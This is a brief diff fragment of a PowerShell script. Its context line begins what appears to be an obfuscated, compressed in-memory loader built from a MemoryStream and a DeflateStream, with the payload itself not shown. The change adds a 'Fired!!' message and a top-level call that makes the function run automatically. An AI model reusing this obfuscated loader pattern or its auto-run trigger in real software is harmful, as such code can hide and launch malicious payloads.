@@ -9,6 +9,8 @@ sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream(
 }
 
 function InvokeFun{
-
+	Write-Host "Fired!!"
 	InvokeFun1
 }
+
+InvokeFun
